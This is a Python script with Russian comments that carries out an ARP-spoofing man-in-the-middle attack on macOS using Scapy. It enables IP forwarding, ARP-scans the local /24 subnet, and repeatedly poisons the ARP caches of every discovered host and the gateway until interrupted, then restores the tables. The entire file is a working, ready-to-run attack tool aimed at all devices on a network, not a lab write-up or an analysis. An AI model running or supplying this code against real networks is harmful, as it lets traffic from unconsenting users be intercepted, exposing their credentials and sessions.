import argparse
import os
import socket
import subprocess
import sys
import time
from scapy.all import ARP, Ether, sendp, srp


def diff(first, second):
    second = set(second)
    return [item for item in first if item not in second]


def get_gateway():
    """
    Надежно получает IP-адрес шлюза (роутера) в macOS,
    парся вывод команды 'netstat -rn'.
    """
    try:
        output = subprocess.check_output(
            ["netstat", "-rn"], universal_newlines=True
        )
        for line in output.splitlines():
            fields = line.split()
            if fields and fields[0] == "default":
                gateway_ip = fields[1]
                # Если в таблице маршрутизации вместо IP указано имя интерфейса (например, link#4),
                # то нужный IP шлюза находится в третьей колонке.
                if "link" in gateway_ip or gateway_ip.isalpha():
                    gateway_ip = fields[2]
                return gateway_ip
    except Exception as e:
        print(f"[-] Ошибка при получении шлюза через netstat: {e}")
        sys.exit(1)
    return None


def get_masc():
    """Автоматически определяет маску подсети на основе IP шлюза (например, '192.168.23.')."""
    gateway = get_gateway()
    if not gateway:
        print("[-] Не удалось определить IP шлюза. Проверьте подключение к сети.")
        sys.exit(1)
    self_ip = gateway.split(".")
    return self_ip[0] + "." + self_ip[1] + "." + self_ip[2] + "."


def enable_ip_route(verbose=True):
    """Включает IP forwarding в macOS через sysctl (требуется sudo)."""
    if verbose:
        print("[!] Включение IP Forwarding (маршрутизации пакетов)...")
    try:
        current_status = (
            subprocess.check_output(
                ["sysctl", "-n", "net.inet.ip.forwarding"],
                universal_newlines=True,
            )
            .strip()
        )
        if current_status == "1":
            if verbose:
                print("[!] IP Routing уже включен.")
            return

        subprocess.check_call(["sysctl", "-w", "net.inet.ip.forwarding=1"])
        if verbose:
            print("[+] IP Routing успешно включен.")
    except subprocess.CalledProcessError:
        print(
            "[-] Не удалось включить IP forwarding. Вы запустили скрипт с sudo?"
        )
        sys.exit(1)


def get_mac(ip):
    """Возвращает MAC-адрес устройства через ARP-запрос Scapy."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0
    )
    if ans:
        return ans[0][1].src
    return None


def get_self_ip():
    """Возвращает только строку локального IP-адреса (без порта)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]  # Извлекаем только IP-адрес из кортежа
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip


def ip4_addresses():
    """
    Сканирует всю подсеть мгновенно, используя ARP-запросы Scapy вместо ping.
    Выполняется за 1-2 секунды.
    """
    masc = get_masc()
    target_subnet = masc + "0/24"
    print(f"[*] Быстрое ARP-сканирование подсети {target_subnet}...")

    try:
        # Отправляем один широковещательный ARP-запрос на всю подсеть
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_subnet),
            timeout=2,
            verbose=0,
        )

        active_ips = []
        total = len(ans)

        for index, received in enumerate(ans, 1):
            ip = received[1].psrc
            active_ips.append(ip)

            # Визуальный прогресс-бар по полученным ответам
            percent = (index / total) * 100 if total > 0 else 100
            sys.stdout.write(
                f"\r[*] Найдено ответов: [{index}/{total}] {percent:.1f}% | Активный хост: {ip}".ljust(
                    80
                )
            )
            sys.stdout.flush()

        print()  # Перенос строки после завершения прогресс-бара
        return active_ips

    except Exception as e:
        print(f"\n[-] Критическая ошибка ARP сканирования: {e}")
        return []


def spoof(target_ip, host_ip, verbose=True):
    """Отправляет ARP-ответ, упакованный в Ethernet-кадр (без WARNING на macOS)."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        return

    arp_response = ARP(
        pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at"
    )
    packet = Ether(dst=target_mac) / arp_response
    sendp(packet, verbose=0)

    if verbose:
        self_mac = ARP().hwsrc
        print(f"[+] Sent to {target_ip} : {host_ip} is-at {self_mac}")


def restore(target_ip, host_ip, verbose=True):
    """Восстанавливает исходные ARP-таблицы при выходе."""
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    if not target_mac or not host_mac:
        return

    arp_response = ARP(
        pdst=target_ip,
        hwdst=target_mac,
        psrc=host_ip,
        hwsrc=host_mac,
        op="is-at",
    )
    packet = Ether(dst=target_mac) / arp_response
    sendp(packet, verbose=0, count=7)
    if verbose:
        print(f"[+] Восстановлено {target_ip} : {host_ip} is-at {host_mac}")


def spoof_all(targets, host, verbose=False):
    if not targets:
        print("[-] Нет активных целей для спуфинга.")
        return

    print(f"[*] Начинаем атаку на {len(targets)} устройств...")
    try:
        while True:
            for target in targets:
                if verbose:
                    print(f"Спуфинг {target}")
                spoof(target, host, verbose)
                spoof(host, target, verbose)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Остановка атаки. Восстановление сетевых настроек...")
        for target in targets:
            restore(target, host, verbose)
            restore(host, target, verbose)
        print("[+] Сеть восстановлена. Выход.")


if __name__ == "__main__":
    # macOS требует root-прав для работы с сырыми сокетами Scapy и sysctl
    if os.geteuid() != 0:
        print(
            "[-] Этот скрипт ДОЛЖЕН быть запущен с правами суперпользователя (sudo)."
        )
        sys.exit(1)

    parser = argparse.ArgumentParser(description="ARP spoof script for macOS")
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Подробный вывод отправки пакетов",
    )
    args = parser.parse_args()
    verbose = args.verbose

    enable_ip_route(verbose)

    host = get_gateway()
    self_ip = get_self_ip()
    exclude = [self_ip, host]

    print(f"[+] Ваш IP: {self_ip}")
    print(f"[+] IP Шлюза: {host}")

    # Мгновенный ARP-сканер всей подсети
    scanned_targets = ip4_addresses()
    targets = diff(scanned_targets, exclude)

    print(f"[+] Финальный список обнаруженных целей для атаки: {targets}")

    spoof_all(targets, host, verbose)
